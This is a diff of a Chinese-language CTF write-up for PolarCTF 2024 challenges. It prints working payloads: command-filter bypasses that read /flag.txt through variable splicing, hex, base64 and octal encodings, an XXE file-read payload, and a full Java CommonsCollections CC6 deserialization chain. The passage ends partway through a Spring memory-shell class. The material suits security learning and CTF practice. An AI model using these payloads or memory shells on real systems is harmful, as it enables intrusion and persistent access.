+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">twothree=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/i</span>ndex/resource=flag<br></code></pre></td></tr></table></figure>
 
 <blockquote>
 <p>flag{29dba9019e40d75a5053b15f4f2906e1}</p>
 </blockquote>
 <h1 id="你知道sys还能这样玩吗"><a href="#你知道sys还能这样玩吗" class="headerlink" title="你知道sys还能这样玩吗"></a>你知道sys还能这样玩吗</h1><p>好家伙，开局403怼脸，来者不善，啥都没给，先猜，结果在sys.php有东西</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget/i&#x27;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
 
 <p>就过滤了普通一些特定组合命令，这里因为直接执行系统命令，可以用bash的做法做，我这里使用变量拼接：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls /</span><br><span class="line">cmd=a=l;b=s;$a$b /;</span><br></pre></td></tr></table></figure>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">ls /<br><span class="hljs-attribute">cmd</span><span class="hljs-operator">=</span>a<span class="hljs-operator">=</span>l<span class="hljs-comment">;b=s;$a$b /;</span><br></code></pre></td></tr></table></figure>
 
 <p>看到根目录有flag.txt，但是这里把<code>*</code> <code>?</code> <code>.</code>都过滤了，但是中括号还没有，可以用中括号的通配符：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /flag[^a]txt</span><br><span class="line">cmd=a=ca;b=t;c=fla;d=g[^a]txt;$a$b /$c$d;</span><br></pre></td></tr></table></figure>
+<figure class="highlight parser3"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs parser3"><span class="language-xml">cat /flag[</span><span class="hljs-keyword">^a</span><span class="language-xml">]txt</span><br><span class="language-xml">cmd=a=ca;b=t;c=fla;d=g[</span><span class="hljs-keyword">^a</span><span class="language-xml">]txt;</span><span class="hljs-variable">$a</span><span class="hljs-variable">$b</span><span class="language-xml"> /</span><span class="hljs-variable">$c</span><span class="hljs-variable">$d</span><span class="language-xml">;</span><br></code></pre></td></tr></table></figure>
 
 <blockquote>
 <p>flag{196b0f14eba66e10fba74dbf9e99c22f}</p>
 </blockquote>
 <h4 id="法二："><a href="#法二：" class="headerlink" title="法二："></a>法二：</h4><p>利用php -r 执行php代码，编码绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=php -r &#x27;system(hex2bin(&quot;636174202f666c61672e747874&quot;));&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">cmd=php -r &#x27;system(hex2bin(&quot;<span class="hljs-number">63617420</span>2f666c<span class="hljs-number">6167</span>2e<span class="hljs-number">747874</span>&quot;));&#x27;<br></code></pre></td></tr></table></figure>
 
 <p>不用双引号的版本：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=php -r &#x27;system(hex2bin(ff3b636174202f666c61672e747874));&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">cmd=php -r &#x27;system(hex2bin(ff3b<span class="hljs-number">63617420</span>2f666c<span class="hljs-number">6167</span>2e<span class="hljs-number">747874</span>));&#x27;<br></code></pre></td></tr></table></figure>
 
-<p><img src="file:////home/yinyun/.config/QQ/nt_qq_82839f1201706a4c8cdc22423c5b3f9d/nt_data/Pic/2024-06/Ori/def9c1ccf5ba304f9de09359423b6f76.png" alt="img"></p>
-<p><img src="/img/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20240610141001972.png" alt="image-20240610141001972"></p>
+<p><img src="file:////home/yinyun/.config/QQ/nt_qq_82839f1201706a4c8cdc22423c5b3f9d/nt_data/Pic/2024-06/Ori/def9c1ccf5ba304f9de09359423b6f76.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="/img/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20240610141001972.png" srcset="/img/loading.gif" lazyload alt="image-20240610141001972"></p>
 <h4 id="法三："><a href="#法三：" class="headerlink" title="法三："></a>法三：</h4><p>printf和双引号绕过base64加密</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=`printf &quot;Y2F0IC9mbGFnLnR4dA==&quot;|bas&quot;&quot;e64 -d`</span><br></pre></td></tr></table></figure>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">cmd</span><span class="language-bash">=`<span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;Y2F0IC9mbGFnLnR4dA==&quot;</span>|bas<span class="hljs-string">&quot;&quot;</span>e64 -d`</span><br></code></pre></td></tr></table></figure>
 
 <h4 id="法四："><a href="#法四：" class="headerlink" title="法四："></a>法四：</h4><p>八进制转化</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=$%27\143\141\164%27%3c$%27\57\146\154\141\147\56\164\170\164%27</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cmd</span>=$%<span class="hljs-number">27</span>\<span class="hljs-number">143</span>\<span class="hljs-number">141</span>\<span class="hljs-number">164</span>%<span class="hljs-number">27</span>%<span class="hljs-number">3</span>c$%<span class="hljs-number">27</span>\<span class="hljs-number">57</span>\<span class="hljs-number">146</span>\<span class="hljs-number">154</span>\<span class="hljs-number">141</span>\<span class="hljs-number">147</span>\<span class="hljs-number">56</span>\<span class="hljs-number">164</span>\<span class="hljs-number">170</span>\<span class="hljs-number">164</span>%<span class="hljs-number">27</span><br></code></pre></td></tr></table></figure>
 
 
 
@@ -382,731 +366,417 @@
 <p>报错有  DOMDocument::loadXML()</p>
 <p>结合题目名字，猜测是xxe实体注入</p>
 <p>直接上payload</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flagggg.php&quot;</span>&gt;</span> ]&gt;</span> <span class="tag">&lt;<span class="name">xml</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">xml</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [ <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=flagggg.php&quot;</span>&gt;</span> ]&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">xml</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">xml</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/img/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20240610141823959.png" alt="image-20240610141823959"></p>
+<p><img src="/img/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20240610141823959.png" srcset="/img/loading.gif" lazyload alt="image-20240610141823959"></p>
 <p>PD9waHANCi8vZmxhZ3s3ZTk3ZThjNGY5ZDZiZTM1YWU4NTAwYjlmYjJjZGQzZX0NCg&#x3D;&#x3D;</p>
 <blockquote>
 <p>flag{7e97e8c4f9d6be35ae8500b9fb2cdd3e}</p>
 </blockquote>
 <p>然后困难部分就全是java了&#x3D;-&#x3D;</p>
 <h1 id="CC链"><a href="#CC链" class="headerlink" title="CC链"></a>CC链</h1><p>cc6链，不出网打内存马，内存马下面给了。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">btout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(btout);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> btout.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserialize</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] serialized)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">btin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(btin);</span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz1</span> <span class="operator">=</span> pool.get(SpringEcho.class.getName());</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;clazz1.toBytecode()&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Infernity&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getClass&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, obj);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;key&quot;</span>);</span><br><span class="line">        outerMap.remove(obj);</span><br><span class="line">        setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] obs = serialize(expMap);</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(obs)));</span><br><span class="line">        deserialize(obs);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] serialize(<span class="hljs-keyword">final</span> Object obj) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">btout</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objOut</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(btout);<br>        objOut.writeObject(obj);<br>        <span class="hljs-keyword">return</span> btout.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] serialized)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">btin</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(serialized);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objIn</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(btin);<br>        <span class="hljs-keyword">return</span> objIn.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz1</span> <span class="hljs-operator">=</span> pool.get(SpringEcho.class.getName());<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz1.toBytecode()&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Infernity&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getClass&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformer);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tme</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, obj);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tme, <span class="hljs-string">&quot;key&quot;</span>);<br>        outerMap.remove(obj);<br>        setFieldValue(transformer, <span class="hljs-string">&quot;iMethodName&quot;</span>, <span class="hljs-string">&quot;newTransformer&quot;</span>);<br>        <span class="hljs-type">byte</span>[] obs = serialize(expMap);<br>        System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.getEncoder().encode(obs)));<br>        deserialize(obs);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 
 
 <h1 id="ezJson"><a href="#ezJson" class="headerlink" title="ezJson"></a>ezJson</h1><p>fastjson-1.2.83原生反序列化。ysoserial有现成的exp。</p>
 <p>只需要准备好回显内存马就行</p>
-<p><img src="/img/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20241203165944345.png" alt="image-20241203165944345"></p>
+<p><img src="/img/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20241203165944345.png" srcset="/img/loading.gif" lazyload alt="image-20241203165944345"></p>
 <p>具体怎么构造的链子，可以看<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Ds421g7pw/?vd_source=cd1ee3d9c8c623012da5b159695424ee&p=11&spm_id_from=333.788.videopod.sections">https://www.bilibili.com/video/BV1Ds421g7pw/?vd_source=cd1ee3d9c8c623012da5b159695424ee&amp;p=11&amp;spm_id_from=333.788.videopod.sections</a></p>
 <p>shell.class：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Memshell.fastjson1_nei_chun_ma;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">shell</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">shell</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            org.springframework.web.context.request.<span class="type">RequestAttributes</span> <span class="variable">requestAttributes</span> <span class="operator">=</span> org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();</span><br><span class="line">            javax.servlet.http.<span class="type">HttpServletRequest</span> <span class="variable">httprequest</span> <span class="operator">=</span> ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();</span><br><span class="line">            javax.servlet.http.<span class="type">HttpServletResponse</span> <span class="variable">httpresponse</span> 